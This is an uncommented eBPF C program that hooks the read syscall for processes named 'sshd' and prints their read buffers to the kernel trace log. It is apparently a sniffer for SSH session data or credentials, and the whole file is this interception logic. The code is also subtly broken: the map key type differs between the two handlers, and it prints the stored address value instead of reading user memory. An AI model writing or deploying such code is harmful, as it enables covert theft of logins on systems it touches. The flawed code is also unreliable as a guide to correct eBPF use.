#include "vmlinux.h"
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

#define TASK_COMM_LEN 5

struct {
  __uint(type, BPF_MAP_TYPE_HASH);
  __uint(max_entries, 8192);
  __type(key, u16);
  __type(value, u64);
} read_bufs SEC(".maps");

SEC("tp/syscalls/sys_enter_read")
int h_sys_enter_read(struct trace_event_raw_sys_enter *ctx) {
  char comm[TASK_COMM_LEN];
  bpf_get_current_comm(&comm, sizeof(comm));

  u16 tid = bpf_get_current_pid_tgid();

  if (comm[0] == 's' && comm[1] == 's' && comm[2] == 'h' && comm[3] == 'd') {
    u64 read_buf = ctx->args[1];
    bpf_map_update_elem(&read_bufs, &tid, &read_buf, BPF_ANY);
  }

  return 0;
}

SEC("tp/syscalls/sys_exit_read")
int h_sys_exit_read(struct trace_event_raw_sys_exit *ctx) {
  char comm[TASK_COMM_LEN];
  bpf_get_current_comm(&comm, sizeof(comm));

  u64 tid = bpf_get_current_pid_tgid();

  if (comm[0] == 's' && comm[1] == 's' && comm[2] == 'h' && comm[3] == 'd') {
    char *read_buf_addr = bpf_map_lookup_elem(&read_bufs, &tid);
    bpf_map_delete_elem(&read_bufs, &tid);
    bpf_printk("x: %s\n", read_buf_addr);
  }

  return 0;
}

char LICENSE[] SEC("license") = "GPL";
